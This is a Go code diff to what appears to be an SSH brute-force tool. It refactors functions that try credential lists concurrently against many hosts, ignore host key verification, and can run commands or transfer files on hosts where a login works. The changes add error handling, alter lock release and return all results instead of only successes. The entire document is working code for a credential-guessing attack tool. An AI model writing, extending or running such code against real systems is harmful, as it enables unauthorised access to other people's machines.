@@ -60,20 +60,24 @@ type SSHResult struct {
 }
 
 // SSH Functions
-func PublicKeyFile(file string) ssh.AuthMethod {
+func PublicKeyFile(file string) (ssh.AuthMethod, error) {
 	buffer, err := ioutil.ReadFile(file)
 	if err != nil {
-		return nil
+		return nil, err
 	}
 
 	key, err := ssh.ParsePrivateKey(buffer)
 	if err != nil {
-		return nil
+		return nil, err
 	}
-	return ssh.PublicKeys(key)
+	return ssh.PublicKeys(key), nil
 }
 
 func SSHLogin(host string, port int, cred Credential, debug bool, command string, source string, destination string) {
+	res := SSHResult{
+		Host:     host,
+		Username: cred.Username,
+	}
 	var sshConfig *ssh.ClientConfig
 	if cred.PrivateKey == "" {
 		sshConfig = &ssh.ClientConfig{
@@ -83,18 +87,22 @@ func SSHLogin(host string, port int, cred Credential, debug bool, command string
 			Auth:            []ssh.AuthMethod{ssh.Password(cred.Password)},
 		}
 	} else {
+		sshAuthMethodPrivateKey, err := PublicKeyFile(cred.PrivateKey)
+		if err != nil {
+			res.Success = false
+			res.Status = err.Error()
+			sshResultChan <- res
+			return
+		}
 		sshConfig = &ssh.ClientConfig{
 			User:            cred.Username,
 			Timeout:         500 * time.Millisecond,
 			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-			Auth:            []ssh.AuthMethod{PublicKeyFile(cred.PrivateKey)},
+			Auth:            []ssh.AuthMethod{sshAuthMethodPrivateKey},
 		}
 	}
 	// log.Println("Dialing:", host)
-	res := SSHResult{
-		Host:     host,
-		Username: cred.Username,
-	}
+
 	if cred.PrivateKey == "" {
 		res.Secret = cred.Password
 		// successStr = fmt.Sprintf("[SSH] Hostname: %s\tUsername: %s\tPassword: %s", host, cred.Username, cred.Password)
@@ -163,9 +171,9 @@ func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool, co
 		auth.lock.Acquire(context.TODO(), 1)
 		wg.Add(1)
 		go func(port int, cred Credential, debug bool, command string, source string, destination string) {
-			defer auth.lock.Release(1)
-			defer wg.Done()
 			SSHLogin(auth.host, port, cred, debug, command, source, destination)
+			wg.Done()
+			auth.lock.Release(1)
 		}(port, creds[i], debug, command, source, destination)
 	}
 	wg.Wait()
@@ -182,16 +190,15 @@ func SSHBruteHost(host string, port int, creds []Credential, debug bool, command
 
 func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool, command string, source string, destination string) []SSHResult {
 	for i := 0; i < len(hosts); i++ {
-		go func(host string, port int, creds []Credential, debug bool, command string, source string, destination string) {
-			SSHBruteHost(host, port, creds, debug, command, source, destination)
-		}(hosts[i], port, creds, debug, command, source, destination)
+		go SSHBruteHost(hosts[i], port, creds, debug, command, source, destination)
 	}
 	var successfulHosts []SSHResult
 	for i := 0; i < len(hosts); i++ {
 		res := <-sshResultChan
-		if res.Success {
-			successfulHosts = append(successfulHosts, res)
-		}
+		//if res.Success {
+		//	successfulHosts = append(successfulHosts, res)
+		//}
+		successfulHosts = append(successfulHosts, res)
 	}
 	return successfulHosts
 }
